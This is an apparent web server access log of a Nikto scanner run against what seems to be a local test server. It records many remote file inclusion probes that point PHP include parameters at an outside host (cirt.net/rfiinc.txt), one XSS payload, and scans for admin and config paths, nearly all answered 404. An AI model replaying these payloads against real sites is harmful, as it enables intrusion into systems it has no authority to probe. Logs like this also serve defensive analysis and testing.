172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/NetworksDirectoryModule/NetworksDirectoryModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 563 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006116)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/NewestGroupsModule/NewestGroupsModule.php?current_blockmodule_pathhttp://cirt.net/rfiinc.txt? HTTP/1.1" 404 553 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006117)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/PeopleModule/PeopleModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 541 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006118)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/PopularTagsModule/PopularTagsModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 551 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006119)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/PostContentModule/PostContentModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 551 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006120)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/ProfileFeedModule/ProfileFeedModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 551 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006121)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/RecentCommentsModule/RecentCommentsModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 557 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006122)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/RecentPostModule/RecentPostModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 549 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006123)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/RecentTagsModule/RecentTagsModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 549 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006124)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/RegisterModule/RegisterModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 545 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006125)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/SearchGroupsModule/SearchGroupsModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 553 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006126)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/ShowAnnouncementModule/ShowAnnouncementModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 561 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006127)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/ShowContentModule/ShowContentModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 551 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006128)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/TakerATourModule/TakerATourModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 549 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006129)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/UploadMediaModule/UploadMediaModule.php?current_blockmodule_pathhttp://cirt.net/rfiinc.txt? HTTP/1.1" 404 551 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006130)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/UserMessagesModule/UserMessagesModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 553 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006131)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/UserPhotoModule/UserPhotoModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 547 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006132)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/VideosMediaGalleryModule/VideosMediaGalleryModule.php?current_blockmodule_pathhttp://cirt.net/rfiinc.txt? HTTP/1.1" 404 565 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006133)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/BetaBlockModules/ViewAllMembersModule/ViewAllMembersModule.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 557 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006134)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/Flickrclient.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006135)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/help.php?LIBSDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006136)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/includes/blogger.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006137)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/includes/functions/auto_email_notify.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006138)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/includes/functions/html_generate.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006139)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/includes/functions/validations.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006140)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/index.php?LIBSDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006141)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/lib/xml/oai/ListRecords.php?xml_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006142)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/login.php?LIBSDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006143)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/logout.php?LIBSDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006144)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/lom.php?ETCDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006145)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/network_module_selector.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006146)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/submit_abuse.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006147)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /web/submit_comment.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006148)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /webavis/class/class.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006149)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /webavis/class/class.php?root=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006150)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /webmail/includes/mailaccess/pop3/core.php?CONFIG[pear_dir]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 532 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006151)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /webnews/template.php?content_page=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006152)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /webroot/css.php?CONFIGS=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006153)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /webyep-system/program/lib/WYURL.php?webyep_sIncludePath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006154)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /webyep-system/programm/webyep.php?webyep_sIncludePath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006155)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /window.php?action=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006156)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wordpress/wp-content/plugins/sniplets/modules/syntax_highlight.php?libpath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 557 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006157)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /work/index.php?g_include=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006158)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /work/module/forum/forum.php?g_include=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006159)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /worldpay_notify.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006160)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wp-cache-phase1.php?plugin=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006161)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wp-content/plugins/dm-albums/template/album.php?SECURITY_FILE=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 538 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006162)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wp-content/plugins/myflash/myflash-button.php?wpPATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 536 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006163)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 552 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006164)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wp-content/plugins/wordtube/wordtube-button.php?wpPATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 538 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006165)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wp-content/plugins/wp-table/js/wptable-button.phpp?wpPATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 541 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006166)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wp-content/plugins/wp-table/js/wptable-button.phpp?wpPATH=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 541 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006167)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wsk/wsk.php?wsk=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006168)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /xarg_corner.php?xarg=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006169)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /xarg_corner_bottom.php?xarg=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006170)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /xarg_corner_top.php?xarg=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006171)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /xoopsgallery/init_basic.php?GALLERY_BASEDIR=http://cirt.net/rfiinc.txt?&2093085906=1&995617320=2 HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006172)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /xoopsgallery/init_basic.php?GALLERY_BASEDIR=http://cirt.net/rfiinc.txt??&2093085906=1&995617320=2 HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006173)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /xt_counter.php?server_base_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006174)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /yabbse/Sources/Packages.php?sourcedir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006175)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /yacs/scripts/update_trailer.php?context[path_to_root]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006176)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /yrch/plugins/metasearch/plug.inc.php?path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006177)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /ytb/cuenta/cuerpo.php?base_archivo=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006178)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /zipndownload.php?PP_PATH=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006179)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /zoomstats/libs/dbmax/mysql.php?GLOBALS['lib']['db']['path']=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006180)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wp-content/plugins/akismet/readme.txt HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006181)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wp-content/plugins/hello.php HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006182)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /readme.html HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006183)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /includes/db.inc HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006184)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /includes/sendmail.inc HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006185)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /license.txt HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006186)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /install.txt HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006187)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /LICENSE.TXT HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006188)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /INSTALL.TXT HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006189)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /READ_THIS_FIRST.txt HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006190)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /wp-app.log HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006191)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /_vti_bin/_vti_adm/admin.dll HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006192)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /read/rss?forum=nonexistant&rev=0.92 HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006193)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /subscribe/survey~1.tml HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006194)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /scripts/message/message_dialog.tml?how_many_back=\\\"><script>alert(1)</script> HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006195)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /read/attach_file.tml?page=http://cirt.net/ HTTP/1.1" 404 475 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006196)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /config/config.txt HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006197)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /htaccess.txt HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006198)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /typo3/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006199)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /ConversionReport.txt HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006201)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /cadence/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006202)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /cadence/webaccess.net HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006204)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /config/readme.txt HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006205)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /data/readme.txt HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006206)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /log/readme.txt HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006207)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /logs/readme.txt HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006208)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /uploads/readme.txt HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006209)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /cadence/help/help.htm HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006210)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET / HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006211)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /install/install.aspx HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006212)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /webresource.axd?d=junk HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006213)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /scriptresource.axd?d=junk HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006214)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admin1.php HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006215)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admin.asp HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006217)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admin/account.asp HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006218)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admin/account.html HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006219)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admin/account.php HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006220)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admin/controlpanel.asp HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006221)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admin/controlpanel.html HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006222)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admin/controlpanel.php HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006223)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admin/cp.asp HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006224)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admin/cp.html HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006225)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admin/cp.php HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006226)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admin/home.asp HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006227)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admin/home.php HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006228)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admin/index.asp HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006229)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admin/index.html HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006230)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admin/login.asp HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006231)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admin/login.html HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006232)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admin/login.php HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006233)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admin1.asp HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006234)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admin1.html HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006235)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admin1/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006236)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admin2.asp HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006237)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admin2.html HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006238)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admin2.php HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006239)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admin4_account/ HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006240)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admin4_colon/ HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006241)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admincontrol.asp HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006242)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admincontrol.html HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006243)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admincontrol.php HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006244)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administer/ HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006245)"
